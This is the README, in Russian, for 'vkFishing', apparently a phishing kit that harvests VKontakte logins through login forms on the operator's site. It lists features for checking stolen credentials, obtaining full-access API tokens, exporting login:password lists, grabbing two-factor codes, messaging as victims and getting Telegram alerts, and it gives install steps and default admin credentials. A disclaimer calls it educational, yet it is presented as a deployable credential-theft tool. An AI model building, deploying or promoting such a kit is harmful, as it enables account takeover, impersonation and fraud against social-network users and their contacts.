# vkFishing
**vkFishing** представляет собой модуль авторизации/регистрации на вашем сайте через логин и пароль от социальной сети ВКонтакте, а также проверяет правильность ввода этих данных. По итогу вы получаете нового пользователя на своем сайте и его VK API токен с полным доступом.

---
В данном проекте реализованно следующее:
* Определение устройства пользователя и подгрузка необходимой страницы авторизации ( мобильная или десктопная версия )
* Проверка введённых данных на валидность
* При успешной авторизации, получение VK API токена с полным доступом
* Повторно авторизованные аккаунты не дублируются в базе данных, а лишь обновляют информацию об аккаунте
* Ненужные логи авторизаций можно скрывать из списка и наоборот
* Можно скачать весь список не скрытых аккаунтов текстовым документом в формате login:password
* О каждом аккаунте можно посмотреть подробную информацию и узнать актуальность данных.
* Можно активировать автоматическое подключение к рассылке сообщений при авторизации или сделать это вручную в подробной информации об аккаунте ( подключение к рассылке через сообщения сообщества )
* При включенной двухфакторной аутентификации в подробностях об аккаунте можно получить код для авторизации (_работает не стабильно_)
* Из подробной информации об аккаунте можно отправлять сообщения любому пользователю по ID от лица владельца аккаунта
* В подробной информации указаны администрируемые сообщества владельцем аккаунта и информация о них
* В подробной информации указаны важные друзья владельца аккаунта
* Можно подключить оповещения в Telegram и получать мгновенную информацию об авторизациях
---

Главная страница
![screenshot of sample](https://i.imgur.com/tZbnn6N.jpg)
Панель управления :: Главная
![screenshot of sample](https://i.imgur.com/grm4qWA.jpg)
Панель управления :: Подробная информация
![screenshot of sample](https://i.imgur.com/U69n9KZ.jpg)
---
# Установка и настройка
1. Скачиваем архив
2. Создаем базу данных и импортируем в нее base.sql
3. Открываем `core/system/mysql.php` и указываем данные от вашей базы данных
4. Загружаем файлы на хостинг и проверяем работоспособность
5. Авторизовываемся в панели управления, переходим в yoursite.com/apanel?act=settings и настраиваем

Админ-панель: `yoursite.com/apanel`
Логин: `Admin`
Пароль: `Admin`
---
> Данный проект разрабатывался в ознакомительных целях и не являлся целью интернет-мошенничества.

